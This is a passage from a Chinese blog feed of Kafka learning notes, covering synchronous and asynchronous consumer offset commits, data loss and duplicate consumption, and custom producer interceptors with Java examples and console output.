punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//同步提交，当前线程会阻塞直到offset提交成功</span>            consumer<span class="token punctuation">.</span><span class="token function">commitSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）异步提交offset</p><p>虽然同步提交offset更可靠一些，但是由于其会阻塞当前线程，直到提交成功。因此吞吐量会收到很大的影响。因此更多的情况下，会选用异步提交offset的方式。</p><p>以下为异步提交offset的示例：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>consumer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>common<span class="token punctuation">.</span>TopicPartition<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomConsumer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Kafka集群</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//消费者组，只要group.id相同，就属于同一个消费者组</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"group.id"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//关闭自动提交offset</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"enable.auto.commit"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KafkaConsumer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaConsumer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者订阅主题</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ConsumerRecords<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> records <span class="token operator">=</span> consumer<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者拉取数据</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>ConsumerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">:</span> records<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"offset = %d, key = %s, value = %s%n"</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//异步提交</span>            consumer<span class="token punctuation">.</span><span class="token function">commitAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OffsetCommitCallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token annotation punctuation">@Override</span>                <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onComplete</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>TopicPartition<span class="token punctuation">,</span> OffsetAndMetadata<span class="token operator">></span> offsets<span class="token punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        System<span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Commit failed for"</span> <span class="token operator">+</span> offsets<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3） 数据漏消费和重复消费分析</p><p>无论是同步提交还是异步提交offset，都有可能会造成数据的漏消费或者重复消费。先提交offset后消费，有可能造成数据的漏消费；而先消费后提交offset，有可能会造成数据的重复消费。</p><h2 id="3-自定义Interceptor"><a href="#3-自定义Interceptor" class="headerlink" title="3 自定义Interceptor"></a>3 自定义Interceptor</h2><h3 id="3-1-拦截器原理"><a href="#3-1-拦截器原理" class="headerlink" title="3.1 拦截器原理"></a>3.1 拦截器原理</h3><p>Producer拦截器(interceptor)是在Kafka 0.10版本被引入的，主要用于实现clients端的定制化控制逻辑。</p><p>对于producer而言，interceptor使得用户在消息发送前以及producer回调逻辑前有机会对消息做一些定制化需求，比如修改消息等。同时，producer允许用户指定多个interceptor按序作用于同一条消息从而形成一个拦截链(interceptor chain)。Intercetpor的实现接口是org.apache.kafka.clients.producer.ProducerInterceptor，其定义的方法包括：</p><p>（1）configure(configs)</p><p>获取配置信息和初始化数据时调用。</p><p>（2）onSend(ProducerRecord)：</p><p>该方法封装进KafkaProducer.send方法中，即它运行在用户主线程中。Producer确保在消息被序列化以及计算分区前调用该方法。用户可以在该方法中对消息做任何操作，但最好保证不要修改消息所属的topic和分区，否则会影响目标分区的计算。</p><p>（3）onAcknowledgement(RecordMetadata, Exception)：</p><p>该方法会在消息从RecordAccumulator成功发送到Kafka Broker之后，或者在发送过程中失败时调用。并且通常都是在producer回调逻辑触发之前。onAcknowledgement运行在producer的IO线程中，因此不要在该方法中放入很重的逻辑，否则会拖慢producer的消息发送效率。</p><p>（4）close：</p><p>关闭interceptor，主要用于执行一些资源清理工作</p><p>如前所述，interceptor可能被运行在多个线程中，因此在具体实现时用户需要自行确保线程安全。另外倘若指定了多个interceptor，则producer将按照指定顺序调用它们，并仅仅是捕获每个interceptor可能抛出的异常记录到错误日志中而非在向上传递。这在使用过程中要特别留意。</p><h3 id="3-2-拦截器案例"><a href="#3-2-拦截器案例" class="headerlink" title="3.2 拦截器案例"></a>3.2 拦截器案例</h3><p>1）需求：</p><p>实现一个简单的双interceptor组成的拦截链。第一个interceptor会在消息发送前将时间戳信息加到消息value的最前部；第二个interceptor会在消息发送后更新成功发送消息数或失败发送消息数。</p><p>2）案例实操</p><p>（1）增加时间戳拦截器</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>RecordMetadata<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TimeInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">ProducerInterceptor</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> configs<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">onSend</span><span class="token punctuation">(</span>ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建一个新的record，把时间戳写入消息体的最前部</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token punctuation">(</span>record<span class="token punctuation">.</span><span class="token function">topic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">partition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onAcknowledgement</span><span class="token punctuation">(</span>RecordMetadata metadata<span class="token punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）统计发送消息成功和发送失败消息数，并在producer关闭时打印这两个计数器</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>RecordMetadata<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CounterInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">ProducerInterceptor</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> errorCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> successCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> configs<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">onSend</span><span class="token punctuation">(</span>ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> record<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onAcknowledgement</span><span class="token punctuation">(</span>RecordMetadata metadata<span class="token punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 统计成功和失败的次数</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            successCounter<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            errorCounter<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 保存结果</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Successful sent: "</span> <span class="token operator">+</span> successCounter<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Failed sent: "</span> <span class="token operator">+</span> errorCounter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）producer主程序</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>KafkaProducer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>Producer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterceptorProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 设置配置信息</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 构建拦截链</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> interceptors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        interceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.molly.kafka.interceptor.TimeInterceptor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     interceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.molly.kafka.interceptor.CounterInterceptor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ProducerConfig<span class="token punctuation">.</span>INTERCEPTOR_CLASSES_CONFIG<span class="token punctuation">,</span> interceptors<span class="token punctuation">)</span><span class="token punctuation">;</span>        String topic <span class="token operator">=</span> <span class="token string">"first"</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 发送消息</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>topic<span class="token punctuation">,</span> <span class="token string">"message"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 一定要关闭producer，这样才会调用interceptor的close方法</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）测试</p><p>（1）在kafka上启动消费者，然后运行客户端java程序。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --from-beginning --topic first1501904047034,message01501904047225,message11501904047230,message21501904047234,message31501904047236,message41501904047240,message51501904047243,message61501904047246,message71501904047249,message81501904047252,message9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/17/bigdata-kafka3-API/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>flume学习笔记（三） flum数据流监控及面试题</title>
      <link>https://m01ly.github.io/2020/11/16/bigdata-flume3-monitor/</link>
      <guid>https://m01ly.github.io/2020/11/16/bigdata-flume3-monitor/</guid>
      <pubDate>Mon, 16 Nov 2020 08:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
